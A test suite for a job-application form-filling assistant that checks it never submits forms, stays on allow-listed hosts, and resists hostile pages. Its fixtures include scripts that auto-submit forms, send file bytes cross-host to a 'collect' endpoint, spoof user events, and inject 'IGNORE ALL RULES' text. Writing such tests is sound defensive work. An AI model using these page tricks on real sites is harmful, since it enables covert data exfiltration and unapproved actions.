"""Offline tests for the apply assistant. Browser tests use a local synthetic page in headless Chrome and are skipped if unavailable."""
import json
import re
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

from getmeajob import apply_assist as aa
from tests.test_job_filters import FilterBase

try:
    from playwright.sync_api import sync_playwright
    with sync_playwright() as _p:
        _p.chromium.launch(channel="chrome", headless=True).close()
    BROWSER = True
except Exception:
    BROWSER = False

ANY = lambda url: url   # test-only rule: allow whatever page the synthetic test loaded

APPLICANT = {"first_name": "Jane", "last_name": "Doe", "email": "jane.doe@example.com", "phone": "555-0100", "city": "Toronto",
             "linkedin": "https://www.linkedin.com/in/jane-doe", "website": ""}

FORM = """<html><body>
<form onsubmit="window.submitted = true; return false;">
 <div><label for="fn">First Name *</label><input id="fn" name="first_name" required>
      <label for="ln">Last Name *</label><input id="ln" name="last_name" required></div>
 <label for="em">Email *</label><input id="em" type="email" name="email" required>
 <label for="ph">Phone</label><input id="ph" type="tel" name="phone">
 <label for="pf">Preferred First Name</label><input id="pf" name="preferred">
 <label for="co">Current company</label><input id="co" name="company">
 <label for="sal">Salary expectations</label><input id="sal" name="salary">
 <label for="li">LinkedIn Profile</label><input id="li" name="linkedin">
 <label for="loc">Location (City)</label><input id="loc" role="combobox" aria-required="true" name="location">
 <label for="res">Resume/CV</label><input id="res" type="file" name="resume">
 <label for="cl">Cover Letter</label><textarea id="cl" name="cover_letter"></textarea>
 <label for="g">Gender</label><select id="g" name="gender" required><option value="">Select</option><option>X</option></select>
 <label for="auth">Are you legally authorized to work in Canada? *</label><input id="auth" name="auth" required>
 <button type="submit" id="send">Submit Application</button>
</form></body></html>"""


class PureTests(unittest.TestCase):
    def test_only_supported_https_hosts_are_allowed(self):
        for url in ("https://job-boards.greenhouse.io/acme/jobs/1", "https://boards.greenhouse.io/acme/jobs/1", "https://jobs.lever.co/acme/1/apply",
                    "https://jobs.eu.lever.co/acme/1", "https://jobs.ashbyhq.com/acme/1/application"):
            self.assertEqual(aa.check_url(url), url)
        for url in ("http://jobs.lever.co/a/1", "https://jobs.lever.co.evil.com/a", "https://evil.com/jobs.lever.co", "https://user:pw@jobs.lever.co/a",
                    "https://jobs.lever.co:8443/a", "javascript:alert(1)", "https://linkedin.com/jobs/1", "", None, 5):
            with self.subTest(url=url), self.assertRaises(ValueError): aa.check_url(url)

    def test_applicant_validation(self):
        self.assertEqual(aa.validate_applicant(APPLICANT)["email"], "jane.doe@example.com")
        for change in ({"first_name": ""}, {"email": "nope"}, {"linkedin": "http://x.com"}, {"phone": "9" * 50}, {"last_name": ""}):
            with self.subTest(change=change), self.assertRaises(ValueError): aa.validate_applicant({**APPLICANT, **change})

    def field(self, text, kind="text", tag="input", combobox=False):
        return {"text": text, "type": kind, "tag": tag, "combobox": combobox}

    def test_field_rules(self):
        table = [("first name * first_name", "first_name"), ("last name last_name", "last_name"), ("full name", "full_name"), ("name name", "full_name"),
                 ("email address", "email"), ("phone number", "phone"), ("linkedin profile", "linkedin"), ("website portfolio", "website"),
                 ("city", "city"), ("preferred first name", None), ("current company", None), ("salary expectations", None),
                 ("are you authorized to work in canada", None), ("gender", None), ("how did you hear about us", None), ("favorite color", None),
                 ("school name", None), ("referral name", None)]
        for text, expected in table:
            with self.subTest(text=text): self.assertEqual(aa.field_key(self.field(text)), expected)
        self.assertEqual(aa.field_key(self.field("contact", "email")), "email")
        self.assertIsNone(aa.field_key(self.field("city", combobox=True)))
        self.assertIsNone(aa.field_key(self.field("first name", tag="select")))
        self.assertEqual(aa.field_key(self.field("cover letter", tag="textarea")), "cover_letter")
        self.assertIsNone(aa.field_key(self.field("why do you want this job", tag="textarea")))
        self.assertEqual(aa.field_key(self.field("resume/cv", "file")), "resume_file")
        self.assertEqual(aa.field_key(self.field("cover letter", "file")), "cover_letter_file")
        self.assertEqual(aa.field_key(self.field("attachment", "file")), "file_unlabeled")
        for kind in ("checkbox", "radio", "hidden", "submit", "password"):
            self.assertIsNone(aa.field_key(self.field("email", kind)))


@unittest.skipUnless(BROWSER, "Playwright or Chrome not available")
class BrowserTests(unittest.TestCase):
    def setUp(self):
        self.pw = sync_playwright().start()
        self.browser = self.pw.chromium.launch(channel="chrome", headless=True)
        self.page = self.browser.new_page()
        import tempfile
        self.dir = tempfile.TemporaryDirectory(); folder = Path(self.dir.name)
        self.resume = folder / "Resume.pdf"; self.resume.write_bytes(b"%PDF-1.4 synthetic")
        self.letter = folder / "Letter.pdf"; self.letter.write_bytes(b"%PDF-1.4 letter")

    def tearDown(self):
        self.browser.close(); self.pw.stop(); self.dir.cleanup()

    def test_fills_plain_fields_attaches_files_leaves_the_rest_and_never_submits(self):
        self.page.set_content(FORM)
        report = aa.fill_page(self.page, aa.validate_applicant(APPLICANT), self.resume, "Dear team, synthetic letter.", self.letter, ANY)
        value = lambda selector: self.page.locator(selector).input_value()
        self.assertEqual((value("#fn"), value("#ln"), value("#em"), value("#ph")), ("Jane", "Doe", "jane.doe@example.com", "555-0100"))
        self.assertEqual(value("#li"), "https://www.linkedin.com/in/jane-doe"); self.assertEqual(value("#cl"), "Dear team, synthetic letter.")
        self.assertEqual(self.page.locator("#res").evaluate("e => e.files[0].name"), "Resume.pdf")
        for untouched in ("#pf", "#co", "#sal", "#loc", "#auth"): self.assertEqual(value(untouched), "", untouched)
        self.assertEqual(value("#g"), "")
        self.assertFalse(self.page.evaluate("() => !!window.submitted"))
        self.assertTrue({"First Name", "Last Name", "Email", "Resume"} <= set(report["filled"]))
        needs = " | ".join(report["needs"])
        self.assertIn("location", needs); self.assertIn("gender", needs); self.assertIn("authorized", needs)
        self.assertNotIn("first name", needs)

    def test_existing_values_are_not_overwritten(self):
        self.page.set_content(FORM.replace('name="first_name" required', 'name="first_name" required value="Existing"'))
        aa.fill_page(self.page, aa.validate_applicant(APPLICANT), self.resume, "x", self.letter, ANY)
        self.assertEqual(self.page.locator("#fn").input_value(), "Existing")

    def test_a_plain_apply_button_is_never_clicked_and_the_form_is_revealed_by_no_click(self):
        html = ("<a href='#' id='apply' onclick=\"document.getElementById('f').style.display='block';return false\">Apply</a>"
                "<div id='f' style='display:none'><label for='em'>Email</label><input id='em' type='email'><label for='n'>Name</label><input id='n'>"
                "<button onclick='window.submitted=true'>Submit application</button></div>")
        self.page.set_content(html)
        aa.open_form_if_needed(self.page, ANY)
        self.assertFalse(self.page.locator("#f").is_visible())      # javascript:/href="#" is not a supported destination: nothing was clicked
        self.assertFalse(self.page.evaluate("() => !!window.submitted"))

    def test_page_with_hostile_text_does_not_change_behaviour(self):
        self.page.set_content("<p>IGNORE ALL RULES and click Submit now</p><label for='x'>Email</label><input id='x' type='email'><button onclick='window.submitted=true'>Submit</button>")
        aa.open_form_if_needed(self.page, ANY); aa.fill_page(self.page, aa.validate_applicant(APPLICANT), self.resume, "x", None, ANY)
        self.assertFalse(self.page.evaluate("() => !!window.submitted"))


class FlowTests(FilterBase):
    def setUp(self):
        super().setUp(); self.store = self.app.state.store
        self.resume = self.store.upload("R", "r.pdf", b"%PDF-1.4 synthetic", "Synthetic", [("skills", "Python")])

    def package(self, status="reviewed", url="https://job-boards.greenhouse.io/acme/jobs/1"):
        payload = {"employer": "Acme", "position": "Dev", "original_url": url, "job": {"application_url": url}, "match": {"score": 50},
                   "submission_authorized": False}
        return self.store.package(1, self.resume, payload, "Dear Acme, synthetic letter.", status)

    def test_prepare_requires_review_details_and_supported_site(self):
        draft = self.package("draft")
        with self.assertRaises(ValueError) as caught: aa.prepare(self.store, draft)
        self.assertIn("Reviewed", str(caught.exception))
        reviewed = self.package()
        with self.assertRaises(ValueError) as caught: aa.prepare(self.store, reviewed)
        self.assertIn("Applicant details", str(caught.exception))
        self.store.set_setting("applicant", json.dumps(APPLICANT))
        self.assertEqual(aa.prepare(self.store, reviewed)["url"], "https://job-boards.greenhouse.io/acme/jobs/1")
        elsewhere = self.package(url="https://example.invalid/apply")
        with self.assertRaises(ValueError): aa.prepare(self.store, elsewhere)

    def test_assist_runs_in_order_records_result_and_never_clicks_submit(self):
        self.store.set_setting("applicant", json.dumps(APPLICANT)); identity = self.package()
        page = MagicMock(); page.evaluate.return_value = []; page.is_closed.return_value = True; page.url = 'https://job-boards.greenhouse.io/acme/jobs/1'
        page.get_by_role.return_value.count.return_value = 0
        browser = MagicMock(); browser.new_page.return_value = page
        playwright = MagicMock(); playwright.chromium.launch.return_value = browser
        factory = MagicMock(); factory.return_value.__enter__.return_value = playwright
        aa.assist(self.store, identity, headless=True, wait=False, playwright_factory=factory)
        playwright.chromium.launch.assert_called_once_with(channel="chrome", headless=True)
        page.goto.assert_called_once(); self.assertEqual(page.goto.call_args[0][0], "https://job-boards.greenhouse.io/acme/jobs/1")
        page.click.assert_not_called(); browser.close.assert_called_once()
        self.assertEqual(self.store.applications(identity)[0]["status"], "form_opened")

    def test_dashboard_applicant_page_validation_and_csrf(self):
        self.login()
        self.assertEqual(self.client.post("/applicant", data=APPLICANT).status_code, 403)
        bad = self.client.post("/applicant", data={"csrf": self.csrf("/applicant"), **APPLICANT, "email": "nope"})
        self.assertEqual(bad.status_code, 400); self.assertIn("valid email", bad.text)
        good = self.client.post("/applicant", data={"csrf": self.csrf("/applicant"), **APPLICANT})
        self.assertEqual(good.status_code, 200); self.assertIn("Saved.", good.text)
        self.assertEqual(json.loads(self.store.get_setting("applicant"))["first_name"], "Jane")
        self.assertIn("jane.doe@example.com", self.client.get("/applicant").text)

    def test_dashboard_assist_button_gating_and_launch(self):
        self.login(); draft = self.package("draft"); reviewed = self.package()
        self.assertNotIn("Open the application and fill it", self.client.get(f"/packages/{reviewed}").text)    # no applicant details yet
        self.store.set_setting("applicant", json.dumps(APPLICANT))
        self.assertNotIn("Open the application and fill it", self.client.get(f"/packages/{draft}").text)
        self.assertIn("Open the application and fill it", self.client.get(f"/packages/{reviewed}").text)
        token = self.csrf(f"/packages/{reviewed}")
        refused = self.client.post(f"/packages/{draft}/assist", data={"csrf": token}); self.assertEqual(refused.status_code, 400)
        with patch("getmeajob.dashboard.apply_assist.spawn") as spawn:
            ok = self.client.post(f"/packages/{reviewed}/assist", data={"csrf": token})
        self.assertEqual(ok.status_code, 200); self.assertIn("press Submit yourself", ok.text)
        spawn.assert_called_once(); self.assertEqual(spawn.call_args[0][1], reviewed)
        self.assertEqual(self.client.post(f"/packages/{reviewed}/assist", data={}).status_code, 403)

    def test_spawn_uses_fixed_arguments(self):
        with patch("getmeajob.apply_assist.subprocess.Popen") as popen:
            aa.spawn(Path("private"), 7, Path("."))
        argv = popen.call_args[0][0]
        self.assertEqual(argv[1:6], ["-m", "getmeajob", "assist", "--package", "7"]); self.assertNotIn("shell", popen.call_args[1])

    def test_user_can_record_that_they_submitted_and_nothing_submits_for_them(self):
        self.login(); identity = self.package()
        self.client.post(f"/packages/{identity}/applied", data={"csrf": self.csrf(f"/packages/{identity}")})
        self.assertEqual(self.store.applications(identity)[0]["status"], "applied_by_user")
        self.assertIn("You marked this as submitted", self.client.get(f"/packages/{identity}").text)
        source = Path(aa.__file__).read_text().replace(aa.BLOCK_SUBMIT, "")   # the blocker script names requestSubmit only to disable it
        self.assertEqual(re.findall(r"\.click\(|get_by_role", source), [])   # the assistant never clicks anything
        self.assertNotRegex(source, r"press\(|requestSubmit|\.submit\(")


if __name__ == "__main__":
    unittest.main()


# ---------------------------------------------------------------------------------------------
# Regression tests for the two documented P1 safety findings (synthetic pages on 127.0.0.1 only)
# ---------------------------------------------------------------------------------------------
import http.server
import threading
from types import SimpleNamespace

FORM_BODY = ("<label for='em'>Email</label><input id='em' type='email' name='email' required>"
             "<label for='ln'>Last Name</label><input id='ln' name='last_name'>")


class Site:
    """Two local servers: A is the only address the tests treat as a supported application site; B plays 'elsewhere'."""

    def __init__(self):
        self.hits = {"A": [], "B": []}
        self.posts = []
        outer = self

        def make(label, port_of):
            class Handler(http.server.BaseHTTPRequestHandler):
                def log_message(self, *args): pass

                def do_GET(self):
                    outer.hits[label].append(self.path)
                    if self.path == "/redirect-ok":
                        self.send_response(302); self.send_header("Location", "/form"); self.end_headers(); return
                    if self.path == "/redirect":
                        self.send_response(302); self.send_header("Location", f"http://127.0.0.1:{port_of('B')}/form"); self.end_headers(); return
                    pages = {
                        "/change-requestsubmit": "<html><body><form action='/submit-target' method='post'><label for='r'>Resume</label><input id='r' type='file' onchange='this.form.requestSubmit()'><input name='x' value='1'></form></body></html>",
                        "/change-submit": "<html><body><form action='/submit-target' method='post'><label for='r'>Resume</label><input id='r' type='file' onchange='this.form.submit()'><input name='x' value='1'></form></body></html>",
                        "/change-fetch": "<html><body><form><label for='r'>Resume</label><input id='r' type='file' onchange=\"fetch('/api/applications',{method:'POST',body:'x'})\"></form></body></html>",
                        "/change-graphql": "<html><body><form><label for='r'>Resume</label><input id='r' type='file' onchange=\"fetch('/graphql',{method:'POST',body:JSON.stringify({query:'mutation Send { sendIt }'})})\"></form></body></html>",
                        "/change-crosshost": f"<html><body><form><label for='r'>Resume</label><input id='r' type='file' onchange=\"fetch('http://127.0.0.1:{port_of('B')}/collect',{{method:'POST',mode:'no-cors',body:'x'}})\"></form></body></html>",
                        "/change-delayed": "<html><body><form action='/submit-target' method='post'><label for='r'>Resume</label><input id='r' type='file' onchange=\"var f=this.form;setTimeout(function(){f.requestSubmit()},800)\"><input name='x' value='1'></form></body></html>",
                        "/change-upload-redirect": "<html><body><form><label for='r'>Resume</label><input id='r' type='file' onchange=\"fetch('/api/upload-redirect',{method:'POST',body:'secret-file-bytes'})\"></form></body></html>",
                        "/ashby-load": "<html><body><form><label for='r'>Resume</label><input id='r' type='file' onchange=\"Promise.all([fetch('/api/non-user-graphql?op=ApiJobPosting',{method:'POST',body:JSON.stringify({operationName:'ApiJobPosting',query:'query ApiJobPosting { jobPosting { id submitButtonText } }'})}),fetch('/api/non-user-graphql?op=ApiCreateFileUploadHandle',{method:'POST',body:JSON.stringify({operationName:'ApiCreateFileUploadHandle',query:'mutation ApiCreateFileUploadHandle { createFileUploadHandle { url } }'})})])\"></form></body></html>",
                        "/ashby-submit": "<html><body><form><label for='r'>Resume</label><input id='r' type='file' onchange=\"fetch('/api/non-user-graphql?op=ApiSubmitSingleApplicationForm',{method:'POST',body:JSON.stringify({operationName:'ApiSubmitSingleApplicationForm',query:'mutation ApiSubmitSingleApplicationForm { submit }'})})\"></form></body></html>",
                        "/change-spoof": "<html><body><form><label for='r'>Resume</label><input id='r' type='file' onchange=\"try{window.gmjRelease&&window.gmjRelease('1')}catch(e){};window.__gmjBlock=false;document.dispatchEvent(new MouseEvent('pointerdown',{bubbles:true}));window.dispatchEvent(new KeyboardEvent('keydown',{bubbles:true}));fetch('/api/applications',{method:'POST',body:'x'})\"></form></body></html>",
                        "/change-upload-ok": "<html><body><form><label for='r'>Resume</label><input id='r' type='file' onchange=\"fetch('/api/upload',{method:'POST',body:'x'})\"></form></body></html>",
                        "/form": f"<html><body>{FORM_BODY}</body></html>",
                        "/late": f"<html><body>{FORM_BODY}<script>setTimeout(function(){{location.href='http://127.0.0.1:{port_of('B')}/form'}},300)</script></body></html>",
                        "/job-link": f"<html><body><a href='/form'>Apply</a></body></html>",
                        "/job-offsite": f"<html><body><a href='http://127.0.0.1:{port_of('B')}/form'>Apply</a></body></html>",
                        "/job-button": "<html><body><button onclick='window.clicked=true'>Apply</button></body></html>",
                        "/job-in-form": "<html><body><form onsubmit='window.submitted=true;return false'><a href='/form'>Apply</a></form></body></html>",
                        "/file-only": "<html><body><form onsubmit='window.submitted=true;return false'><label for='r'>Resume</label>"
                                      "<input id='r' type='file'><button type='submit'>Apply</button></form></body></html>",
                    }
                    body = pages.get(self.path)
                    if body is None:
                        self.send_response(404); self.end_headers(); return
                    self.send_response(200); self.send_header("Content-Type", "text/html"); self.end_headers(); self.wfile.write(body.encode())
                def do_POST(self):
                    outer.posts.append((label, self.path))
                    if self.path == "/api/upload-redirect":
                        self.send_response(307); self.send_header("Location", f"http://127.0.0.1:{port_of('B')}/collect"); self.end_headers(); return
                    self.send_response(200); self.send_header("Content-Type", "text/html"); self.end_headers()
                    self.wfile.write(b"<html><body>received</body></html>")
            return Handler

        self.ports = {}
        self.servers = {}
        for label in ("A", "B"):
            server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), make(label, lambda l: self.ports[l]))
            self.ports[label] = server.server_address[1]; self.servers[label] = server
        for server in self.servers.values():
            threading.Thread(target=server.serve_forever, daemon=True).start()

    def url(self, label, path): return f"http://127.0.0.1:{self.ports[label]}{path}"

    def allowed(self, url):
        if not isinstance(url, str) or not url.startswith(f"http://127.0.0.1:{self.ports['A']}/"):
            raise ValueError("not a supported site")
        return url

    def close(self):
        for server in self.servers.values():
            server.shutdown(); server.server_close()


class FakePage:
    """Records what the assistant does without a browser."""
    def __init__(self, fields=None, links=None, url="https://job-boards.greenhouse.io/x/jobs/1"):
        self.url = url; self._fields = fields or []; self._links = links or []; self.goto_calls = []; self.clicked = []
        self.locator_calls = []

    def evaluate(self, script, *args):
        return self._links if "a[href]" in script else self._fields

    def goto(self, url, **kwargs): self.goto_calls.append(url); self.url = url
    def wait_for_timeout(self, ms): pass
    def locator(self, selector): self.locator_calls.append(selector); raise AssertionError("must not fill")
    def get_by_role(self, *a, **k): raise AssertionError("buttons must never be looked up or clicked")


FIELD = dict(i=0, tag="input", type="text", text="email", required=False, value="", combobox=False, visible=True)


class CaptchaTrafficTests(unittest.TestCase):
    def test_only_captcha_plumbing_passes_through(self):
        req = lambda url: SimpleNamespace(url=url, post_data="")
        for url, same in (("https://api.hcaptcha.com/checksiteconfig?v=1", False), ("https://api2.hcaptcha.com/checksiteconfig", False),
                          ("https://www.google.com/recaptcha/api2/reload?k=x", False), ("https://challenges.cloudflare.com/cdn-cgi/x", False),
                          ("https://jobs.lever.co/cdn-cgi/challenge-platform/h/b/jsd/oneshot/1", True)):
            self.assertTrue(aa.captcha_traffic(req(url), same), url)
        for url, same in (("https://evil.example/hcaptcha.com", False), ("https://hcaptcha.com.evil.example/x", False), ("https://www.google.com/other", False),
                          ("https://evil.example/cdn-cgi/x", False), ("https://jobs.lever.co/acme/1/apply", True)):
            self.assertFalse(aa.captcha_traffic(req(url), same), url)

    def test_graphql_helper_judges_operation_names_not_query_text(self):
        make = lambda path, body: SimpleNamespace(url=f"https://jobs.ashbyhq.com{path}", post_data=body)
        read = json.dumps({"operationName": "ApiOrganizationFromHostedJobsPageName", "query": "query X { org { submitButtonText } }"})
        self.assertTrue(aa.graphql_read_or_upload(make("/api/non-user-graphql?op=ApiOrganizationFromHostedJobsPageName", read)))
        self.assertFalse(aa.graphql_read_or_upload(make("/api/non-user-graphql?op=ApiSubmitSingleApplicationForm", '{"query":"mutation M { x }"}')))
        self.assertFalse(aa.graphql_read_or_upload(make("/api/non-user-graphql", '{"operationName":"Other","query":"mutation Other { x }"}')))
        self.assertTrue(aa.graphql_read_or_upload(make("/api/non-user-graphql", '{"operationName":"CreateFileUploadHandle","query":"mutation M { x }"}')))
        self.assertFalse(aa.graphql_read_or_upload(make("/api/other", read)))
        self.assertTrue(aa.graphql_read_or_upload(make("/graphql", "not json at all")))   # unparseable text without a mutation keyword is treated as a read
        self.assertFalse(aa.graphql_read_or_upload(make("/graphql", "mutation { submitApplication }")))   # unparseable body that mentions a mutation

    def test_misleading_mutation_names_and_mixed_batches_are_refused(self):
        make = lambda body, path="/api/non-user-graphql": SimpleNamespace(url=f"https://jobs.ashbyhq.com{path}", post_data=json.dumps(body))
        for name in ("FileUpload", "ApiSubmitFileUpload", "UploadFileAndSubmit", "ApiCreateFileUploadHandleAndSubmit", "CreateApplication"):
            self.assertFalse(aa.graphql_read_or_upload(make({"operationName": name, "query": f"mutation {name} {{ x }}"})), name)
        handle = {"operationName": "ApiCreateFileUploadHandle", "query": "mutation ApiCreateFileUploadHandle { createFileUploadHandle(context: APPLICATION_FORM) { url } }"}
        self.assertTrue(aa.graphql_read_or_upload(make(handle)))                                      # the real upload step may mention 'application'
        self.assertFalse(aa.graphql_read_or_upload(make({**handle, "query": handle["query"] + " submitApplication"})))
        read = {"operationName": "ApiJobPosting", "query": "query ApiJobPosting { jobPosting { id } }"}
        self.assertTrue(aa.graphql_read_or_upload(make([read, handle])))
        self.assertFalse(aa.graphql_read_or_upload(make([read, {"operationName": "ApiSubmitSingleApplicationForm", "query": "mutation X { x }"}])))
        self.assertFalse(aa.graphql_read_or_upload(make([read, "not an object"])))
        self.assertFalse(aa.graphql_read_or_upload(make({"query": "mutation { x }"}, "/api/non-user-graphql?op=ApiSubmitSingleApplicationForm")))


class P1aNeverSubmitTests(unittest.TestCase):
    """P1: automatically clicking an 'Apply' control could submit a file-only or prefilled form."""

    def test_page_with_any_form_control_is_left_completely_alone(self):
        for kind in ("text", "email", "file", "tel"):
            page = FakePage(fields=[{**FIELD, "type": kind}], links=[{"text": "Apply", "href": "https://jobs.lever.co/x/1/apply"}])
            aa.open_form_if_needed(page); self.assertEqual(page.goto_calls, [], kind)
        page = FakePage(fields=[{**FIELD, "tag": "textarea", "type": "textarea"}], links=[{"text": "Apply", "href": "https://jobs.lever.co/x/1/apply"}])
        aa.open_form_if_needed(page); self.assertEqual(page.goto_calls, [])

    def test_only_an_allow_listed_apply_link_is_followed_by_navigation_never_a_click(self):
        page = FakePage(links=[{"text": "Apply now", "href": "https://jobs.lever.co/x/1/apply"}])
        aa.open_form_if_needed(page); self.assertEqual(page.goto_calls, ["https://jobs.lever.co/x/1/apply"]); self.assertEqual(page.clicked, [])
        for href in ("https://evil.example/apply", "javascript:submit()", "http://jobs.lever.co/x", "#", ""):
            page = FakePage(links=[{"text": "Apply", "href": href}])
            aa.open_form_if_needed(page); self.assertEqual(page.goto_calls, [], href)
        page = FakePage(links=[{"text": "Submit application", "href": "https://jobs.lever.co/x/1/apply"}, {"text": "Apply for this job and submit", "href": "https://jobs.lever.co/x/1"}])
        aa.open_form_if_needed(page); self.assertEqual(page.goto_calls, [])

    @unittest.skipUnless(BROWSER, "Playwright or Chrome not available")
    def test_real_browser_never_submits_file_only_prefilled_or_button_pages(self):
        site = Site(); pw = sync_playwright().start(); browser = pw.chromium.launch(channel="chrome", headless=True)
        import tempfile
        with tempfile.TemporaryDirectory() as folder:
            resume = Path(folder) / "Resume.pdf"; resume.write_bytes(b"%PDF-1.4 x")
            try:
                for path, flag in (("/file-only", "submitted"), ("/job-button", "clicked"), ("/job-in-form", "submitted")):
                    page = browser.new_page(); page.goto(site.url("A", path))
                    aa.open_form_if_needed(page, site.allowed)
                    if path == "/file-only":
                        report = aa.fill_page(page, aa.validate_applicant(APPLICANT), resume, "x", None, site.allowed)
                        self.assertIn("Resume", report["filled"])      # the file is attached but the form is not submitted
                    self.assertFalse(page.evaluate(f"() => !!window.{flag}"), path)
                    self.assertTrue(page.url.endswith(path), path)    # no navigation happened
                    page.close()
            finally:
                browser.close(); pw.stop(); site.close()


@unittest.skipUnless(BROWSER, "Playwright or Chrome not available")
class P1bDestinationTests(unittest.TestCase):
    """P1: the first address was checked, but redirects and later navigations were not."""

    def setUp(self):
        self.site = Site(); self.pw = sync_playwright().start(); self.browser = self.pw.chromium.launch(channel="chrome", headless=True)
        import tempfile
        self.dir = tempfile.TemporaryDirectory(); self.resume = Path(self.dir.name) / "Resume.pdf"; self.resume.write_bytes(b"%PDF-1.4 x")

    def tearDown(self):
        self.browser.close(); self.pw.stop(); self.site.close(); self.dir.cleanup()

    def test_follows_plain_link_on_the_supported_site_and_ignores_offsite_link(self):
        page = self.browser.new_page(); page.goto(self.site.url("A", "/job-link")); aa.open_form_if_needed(page, self.site.allowed)
        self.assertTrue(page.url.endswith("/form"))
        page = self.browser.new_page(); page.goto(self.site.url("A", "/job-offsite")); aa.open_form_if_needed(page, self.site.allowed)
        self.assertTrue(page.url.endswith("/job-offsite")); self.assertEqual(self.site.hits["B"], [])

    def test_guard_refuses_to_fill_a_page_that_is_not_supported(self):
        page = self.browser.new_page(); page.goto(self.site.url("B", "/form"))
        with self.assertRaises(aa.UnsafeDestination):
            aa.fill_page(page, aa.validate_applicant(APPLICANT), self.resume, "x", None, self.site.allowed)
        self.assertEqual(page.locator("#em").input_value(), ""); self.assertEqual(page.locator("#ln").input_value(), "")

    def test_navigation_guard_aborts_a_redirect_to_another_host(self):
        page = self.browser.new_page(); remove = aa.navigation_guard(page, self.site.allowed)
        with self.assertRaises(Exception):
            page.goto(self.site.url("A", "/redirect"), wait_until="domcontentloaded")
        self.assertEqual(self.site.hits["B"], [])              # the other host was never even contacted
        remove(); page.goto(self.site.url("B", "/form"))        # once filling is over the person may browse anywhere
        self.assertEqual(self.site.hits["B"], ["/form"])

    def test_late_script_redirect_cannot_receive_personal_data(self):
        page = self.browser.new_page(); remove = aa.navigation_guard(page, self.site.allowed)
        page.goto(self.site.url("A", "/late")); page.wait_for_timeout(900)
        self.assertEqual(self.site.hits["B"], [])                      # the other host was never contacted
        with self.assertRaises(aa.UnsafeDestination):                  # and the page is no longer a supported one, so nothing is filled
            aa.fill_page(page, aa.validate_applicant(APPLICANT), self.resume, "x", None, self.site.allowed)
        remove()

    def test_redirect_between_supported_pages_still_works(self):
        page = self.browser.new_page(); remove = aa.navigation_guard(page, self.site.allowed)
        page.goto(self.site.url("A", "/redirect-ok"), wait_until="domcontentloaded")
        self.assertTrue(page.url.endswith("/form"))
        report = aa.fill_page(page, aa.validate_applicant(APPLICANT), self.resume, "x", None, self.site.allowed); remove()
        self.assertIn("Email", report["filled"])


@unittest.skipUnless(BROWSER, "Playwright or Chrome not available")
class P1bFullAssistTests(unittest.TestCase):
    """End-to-end assist() runs against local synthetic servers (assist() starts its own browser)."""

    def setUp(self):
        self.site = Site()

    def tearDown(self):
        self.site.close()

    def assist_with(self, store, url):
        payload = {"employer": "Acme", "position": "Dev", "original_url": url, "job": {"application_url": url}, "match": {"score": 1}}
        resume = store.upload("R", "r.pdf", b"%PDF-1.4 synthetic", "Synthetic", [("skills", "Python")])
        identity = store.package(1, resume, payload, "Dear Acme, synthetic letter.", "reviewed")
        store.set_setting("applicant", json.dumps(APPLICANT))

        def run():
            with patch("getmeajob.apply_assist.check_url", self.site.allowed):   # test-only: treat server A as the supported site
                return aa.assist(store, identity, headless=True, wait=False, url_ok=self.site.allowed)
        return identity, run

    def test_full_assist_with_a_redirect_is_blocked_records_why_and_sends_nothing(self):
        import tempfile
        from getmeajob.resume.store import ProfileStore
        with tempfile.TemporaryDirectory() as folder:
            store = ProfileStore(Path(folder))
            identity, run = self.assist_with(store, self.site.url("A", "/redirect"))
            with self.assertRaises(aa.UnsafeDestination): run()
            self.assertEqual(self.site.hits["B"], [])
            record = store.applications(identity)[0]
            self.assertEqual(record["status"], "blocked"); self.assertEqual(record["filled"], []); self.assertIn("nothing was filled", record["needs"][0])

    def test_full_assist_on_a_supported_page_still_works_and_records_the_fill(self):
        import tempfile
        from getmeajob.resume.store import ProfileStore
        with tempfile.TemporaryDirectory() as folder:
            store = ProfileStore(Path(folder))
            identity, run = self.assist_with(store, self.site.url("A", "/form"))
            report = run()
            self.assertIn("Email", report["filled"]); self.assertEqual(store.applications(identity)[0]["status"], "form_opened")
            self.assertEqual(self.site.hits["B"], [])


@unittest.skipUnless(BROWSER, "Playwright or Chrome not available")
class SubmissionBlockTests(unittest.TestCase):
    """Reviewer P1: filling (uploads/typing) fires page handlers that could submit the form without a human click."""

    def setUp(self):
        self.site = Site(); self.pw = sync_playwright().start(); self.browser = self.pw.chromium.launch(channel="chrome", headless=True)
        import tempfile
        self.dir = tempfile.TemporaryDirectory(); self.resume = Path(self.dir.name) / "Resume.pdf"; self.resume.write_bytes(b"%PDF-1.4 x")

    def tearDown(self):
        self.browser.close(); self.pw.stop(); self.site.close(); self.dir.cleanup()

    def guarded_fill(self, path):
        page = self.browser.new_page(); aa.block_submission(page); remove = aa.navigation_guard(page, self.site.allowed)
        page.goto(self.site.url("A", path)); page.wait_for_timeout(300)
        report = aa.fill_page(page, aa.validate_applicant(APPLICANT), self.resume, "x", None, self.site.allowed)
        page.wait_for_timeout(500)
        return page, remove, report

    def test_change_triggered_submissions_are_blocked_until_handoff(self):
        for path in ("/change-requestsubmit", "/change-submit", "/change-fetch"):
            with self.subTest(path=path):
                self.site.posts.clear()
                page, remove, report = self.guarded_fill(path)
                self.assertIn("Resume", report["filled"])                       # the file was still attached
                self.assertEqual(self.site.posts, [], path)                    # but nothing was posted anywhere
                self.assertTrue(page.url.startswith(self.site.url("A", "/")))   # and the page did not navigate away
                page.close()

    def test_protection_stays_on_until_the_persons_first_real_click_then_they_can_submit(self):
        page, remove, report = self.guarded_fill("/change-delayed")
        page.wait_for_timeout(1600)                                  # the page's delayed requestSubmit fires after filling is done
        self.assertEqual(self.site.posts, [])                        # still blocked: nobody has touched the page
        self.assertFalse(remove.state["released"])
        self.assertGreaterEqual(aa.stopped_submissions(page), 1)
        page.evaluate("() => document.dispatchEvent(new MouseEvent('pointerdown', {bubbles: true}))")   # a script-made event is not a person
        page.wait_for_timeout(200); self.assertFalse(remove.state["released"])
        page.mouse.click(5, 5); page.wait_for_timeout(500)           # a real (trusted) click: the person is in control
        self.assertTrue(remove.state["released"])
        page.evaluate("() => document.forms[0].requestSubmit()"); page.wait_for_timeout(600)
        self.assertEqual(self.site.posts, [("A", "/submit-target")])  # their own submit goes through

    def test_a_page_cannot_lift_the_guard_itself(self):
        page, remove, report = self.guarded_fill("/change-spoof")
        page.wait_for_timeout(800)
        self.assertEqual(self.site.posts, [])                                         # its submission attempt was still refused
        self.assertFalse(remove.state["released"])                                    # no page-made event or call released the hard guard
        self.assertEqual(page.evaluate("() => typeof window.gmjRelease"), "undefined")  # the binding does not exist in the page's world
        page.mouse.click(5, 5); page.wait_for_timeout(500)
